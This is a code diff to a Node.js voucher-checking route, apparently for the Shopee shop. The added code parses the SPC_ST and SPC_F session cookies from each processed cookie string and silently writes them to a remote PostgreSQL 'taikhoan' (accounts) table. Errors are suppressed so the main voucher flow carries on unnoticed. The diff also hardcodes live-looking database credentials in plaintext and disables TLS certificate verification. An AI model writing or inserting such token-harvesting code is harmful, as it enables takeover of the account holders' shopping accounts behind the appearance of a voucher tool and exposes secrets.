@@ -1,5 +1,28 @@
 const https = require('https');
 const zlib = require('zlib');
+const { Pool } = require('pg');
+
+// --- Kết nối DB (giống script 2) ---
+const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';
+
+const pool = new Pool({
+    connectionString: DATABASE_URL,
+    ssl: { rejectUnauthorized: false }
+});
+
+// --- Helper: Parse SPC_ST từ chuỗi cookie ---
+function extractSpcSt(cookieStr) {
+    if (!cookieStr) return null;
+    const match = cookieStr.match(/SPC_ST=([^;]+)/);
+    return match ? match[1] : null;
+}
+
+// --- Helper: Parse SPC_F từ chuỗi cookie ---
+function extractSpcF(cookieStr) {
+    if (!cookieStr) return null;
+    const match = cookieStr.match(/SPC_F=([^;]+)/);
+    return match ? match[1] : null;
+}
 
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -33,7 +56,6 @@ function requestWithCookie(cookie, voucherCode) {
             res.on('end', () => {
                 const buffer = Buffer.concat(chunks);
                 let data = buffer.toString('utf8');
-
                 try {
                     const encoding = res.headers['content-encoding'];
                     if (encoding === 'gzip') data = zlib.gunzipSync(buffer).toString('utf8');
@@ -103,6 +125,25 @@ async function handleVoucherRoutes(req, res) {
 
                     if (result.success && result.data?.data) {
                         const invalidCode = result.data.data.invalid_message_code;
+
+                        // --- MỚI: Nếu prop data có value -> lưu SPC_ST vào DB ---
+                        try {
+                            const spcSt = extractSpcSt(COOKIES[i]);
+                            const spcF  = extractSpcF(COOKIES[i]);
+                            if (spcSt) {
+                                await pool.query(
+                                    `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
+                                     VALUES ($1, $2, $3, $4, $5, $6)
+                                     ON CONFLICT (id) DO NOTHING`,
+                                    [null, null, null, null, spcF || null, spcSt]
+                                );
+                            }
+                        } catch (dbErr) {
+                            // Không throw, chỉ log để không làm gián đoạn flow chính
+                            console.error('DB insert error:', dbErr.message);
+                        }
+                        // --- END MỚI ---
+
                         if (invalidCode === 0 || invalidCode === 1) {
                             results.push({
                                 accountIndex: i + 1,
@@ -155,4 +196,4 @@ async function handleVoucherRoutes(req, res) {
     return false;
 }
 
-module.exports = { handleVoucherRoutes };
+module.exports = { handleVoucherRoutes, pool };
